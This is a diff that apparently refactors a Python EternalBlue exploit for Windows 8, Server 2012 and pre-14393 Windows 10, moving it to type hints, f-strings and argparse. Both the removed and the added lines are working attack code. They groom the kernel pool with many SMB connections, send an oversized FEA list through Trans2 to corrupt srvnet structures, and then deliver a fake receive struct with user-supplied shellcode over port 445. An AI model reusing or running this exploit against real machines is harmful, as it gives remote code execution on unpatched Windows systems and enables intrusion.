-	# send last fragment to create buffer in hole and OOB write one of srvnetConn struct header
-	# second trigger, place fake struct and shellcode
-	send_trans2_second(conn, tid, feaList[progress:], progress)
-	recvPkt = conn.recvSMB()
-	retStatus = recvPkt.getNTStatus()
-	if retStatus == 0xc000000d:
-		print('good response status: INVALID_PARAMETER')
-	else:
-		print('bad response status: 0x{:08x}'.format(retStatus))
+    if data:
+        pad2_len = (4 - (fixed_offset + pad_len + len(param)) % 4) % 4
+        trans_command["Data"]["Pad2"] = b"\xFF" * pad2_len
+    else:
+        trans_command["Data"]["Pad2"] = b""
+        pad2_len = 0
 
-	# one of srvnetConn struct header should be modified
-	# a corrupted buffer will write recv data in designed memory address
-	for sk in srvnetConn:
-		sk.send(fake_recv_struct + shellcode)
+    params["DataCount"] = first_data_fragment_size
+    params["DataOffset"] = params["ParameterOffset"] + len(param) + pad2_len
 
-	# execute shellcode
-	for sk in srvnetConn:
-		sk.close()
-	
-	# nicely close connection (no need for exploit)
-	nxconn.disconnect_tree(tid)
-	nxconn.logoff()
-	nxconn.get_socket().close()
-	conn.disconnect_tree(tid)
-	conn.logoff()
-	conn.get_socket().close()
+    trans_command["Data"]["Trans_Parameters"] = param
+    trans_command["Data"]["Trans_Data"] = data[:first_data_fragment_size]
+    pkt.addCommand(trans_command)
+
+    conn.sendSMB(pkt)
+    recv_pkt = conn.recvSMB()
+    if recv_pkt.getNTStatus() == 0:
+        print("got good NT Trans response")
+    else:
+        print(f"got bad NT Trans response: 0x{recv_pkt.getNTStatus():x}")
+        sys.exit(1)
+
+    index = first_data_fragment_size
+    while index < len(data):
+        send_size = min(4096, len(data) - index)
+        if len(data) - index <= 4096 and not send_last_chunk:
+            break
+        send_trans2_second(conn, tid, data[index : index + send_size], index)
+        index += send_size
+
+    if send_last_chunk:
+        conn.recvSMB()
+    return index
 
 
-if len(sys.argv) < 3:
-	print("{} <ip> <shellcode_file> [numGroomConn]".format(sys.argv[0]))
-	sys.exit(1)
+def create_connection_with_big_smb_first80(target: str, for_nx: bool = False) -> socket.socket:
+    sk = socket.create_connection((target, 445))
+    pkt = b"\x00" + b"\x00" + pack(">H", 0x8100)
+    pkt += b"BAAD"
+    if for_nx:
+        sk.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        pkt += b"\x00" * 0x7B
+    else:
+        pkt += b"\x00" * 0x7C
+    sk.send(pkt)
+    return sk
 
-TARGET=sys.argv[1]
-numGroomConn = 13 if len(sys.argv) < 4 else int(sys.argv[3])
 
-fp = open(sys.argv[2], 'rb')
-sc = fp.read()
-fp.close()
+def exploit(
+    target: str,
+    shellcode: bytes,
+    num_groom_conn: int,
+    fea_list: bytes,
+    fea_list_nx: bytes,
+) -> None:
+    conn = smb.SMB(target, target)
+    conn.login(USERNAME, PASSWORD)
+    server_os = conn.get_server_os()
+    print(f"Target OS: {server_os}")
+    if server_os.startswith("Windows 10 "):
+        build = int(server_os.split()[-1])
+        if build >= 14393:
+            print("This exploit does not support this target")
+            sys.exit()
+    elif not (server_os.startswith("Windows 8") or server_os.startswith("Windows Server 2012 ")):
+        print("This exploit does not support this target")
+        sys.exit()
 
-if len(sc) > 0xe80:
-	print('Shellcode too long. The place that this exploit put a shellcode is limited to {} bytes.'.format(0xe80))
-	sys.exit()
+    tid = conn.tree_connect_andx(f"\\\\{target}\\IPC$")
 
-# Now, shellcode is known. create a feaList
-feaList = createFeaList(len(sc))
+    progress = send_big_trans2(conn, tid, 0, fea_list, b"\x00" * 30, len(fea_list) % 4096, False)
 
-print('shellcode size: {:d}'.format(len(sc)))
-print('numGroomConn: {:d}'.format(numGroomConn))
+    nxconn = smb.SMB(target, target)
+    nxconn.login(USERNAME, PASSWORD)
+    nxtid = nxconn.tree_connect_andx(f"\\\\{target}\\IPC$")
+    nxprogress = send_big_trans2(nxconn, nxtid, 0, fea_list_nx, b"\x00" * 30, len(fea_list_nx) % 4096, False)
 
-exploit(TARGET, sc, numGroomConn)
-print('done')
+    alloc_conn = create_session_alloc_non_paged(target, NTFEA_SIZE - 0x2010)
+
+    srvnet_conn = []
+    for _ in range(num_groom_conn):
+        sk = create_connection_with_big_smb_first80(target, for_nx=True)
+        srvnet_conn.append(sk)
+
+    hole_conn = create_session_alloc_non_paged(target, NTFEA_SIZE - 0x10)
+    alloc_conn.get_socket().close()
+
+    for _ in range(5):
+        sk = create_connection_with_big_smb_first80(target, for_nx=True)
+        srvnet_conn.append(sk)
+
+    hole_conn.get_socket().close()
+
+    send_trans2_second(nxconn, nxtid, fea_list_nx[nxprogress:], nxprogress)
+    recv_pkt = nxconn.recvSMB()
+    ret_status = recv_pkt.getNTStatus()
+    if ret_status == 0xC000000D:
+        print("good response status for nx: INVALID_PARAMETER")
+    else:
+        print(f"bad response status for nx: 0x{ret_status:08x}")
+
+    for sk in srvnet_conn:
+        sk.send(b"\x00")
+
+    send_trans2_second(conn, tid, fea_list[progress:], progress)
+    recv_pkt = conn.recvSMB()
+    ret_status = recv_pkt.getNTStatus()
+    if ret_status == 0xC000000D:
+        print("good response status: INVALID_PARAMETER")
+    else:
+        print(f"bad response status: 0x{ret_status:08x}")
+
+    for sk in srvnet_conn:
+        sk.send(FAKE_RECV_STRUCT + shellcode)
+
+    for sk in srvnet_conn:
+        sk.close()
+
+    nxconn.disconnect_tree(tid)
+    nxconn.logoff()
+    nxconn.get_socket().close()
+    conn.disconnect_tree(tid)
+    conn.logoff()
+    conn.get_socket().close()
+
+
+def parse_args(argv: Iterable[str]) -> Tuple[str, str, int]:
+    parser = argparse.ArgumentParser(
+        description="EternalBlue exploit (Windows 8/2012/10 pre-14393)",
+        usage="%(prog)s <ip> <shellcode_file> [numGroomConn]",
+    )
+    parser.add_argument("ip", help="Target IP address")
+    parser.add_argument("shellcode_file", help="Path to shellcode payload")
+    parser.add_argument(
+        "num_groom_conn",
+        nargs="?",
+        type=int,
+        default=13,
+        help="Number of grooming connections to create (default: 13)",
+    )
+    args = parser.parse_args(list(argv))
+    return args.ip, args.shellcode_file, args.num_groom_conn
+
+
+def main(argv: Iterable[str]) -> None:
+    target, shellcode_file, num_groom_conn = parse_args(argv)
+
+    with open(shellcode_file, "rb") as fp:
+        shellcode = fp.read()
+
+    if len(shellcode) > 0xE80:
+        print(
+            "Shellcode too long. The place that this exploit puts a shellcode is limited to "
+            f"{0xE80} bytes."
+        )
+        sys.exit()
+
+    fea_list = create_fea_list(len(shellcode))
+    fea_list_nx = build_fea_list_nx()
+
+    print(f"shellcode size: {len(shellcode):d}")
+    print(f"numGroomConn: {num_groom_conn:d}")
+
+    exploit(target, shellcode, num_groom_conn, fea_list, fea_list_nx)
+    print("done")
+
+
+if __name__ == "__main__":
+    main(sys.argv[1:])
